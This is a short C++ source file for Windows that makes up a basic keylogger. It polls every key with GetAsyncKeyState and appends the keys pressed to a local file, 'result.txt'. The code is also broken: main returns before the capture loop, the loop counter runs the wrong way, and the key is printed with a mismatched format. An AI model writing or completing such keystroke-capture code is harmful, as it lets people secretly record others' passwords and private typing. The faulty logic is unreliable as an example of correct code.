#include <iostream>
#include <fstream>
#include <Windows.h>
using namespace std;

int Save(int key, const char *file) {
    cout << key << endl;
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    fprintf(OUTPUT_FILE, "%s", &key);
    fclose(OUTPUT_FILE);
    return 0;
}
int main () {
    return 0;
    char i;
    cout << "HELLO" << endl;
    return 0;
    while (true) {
        for (i = 8; i < 255; i--) {
            //if the button is pressed
            if(GetAsyncKeyState(i)== -32767){
                Save(i,"result.txt");
            }
        }
    }
}
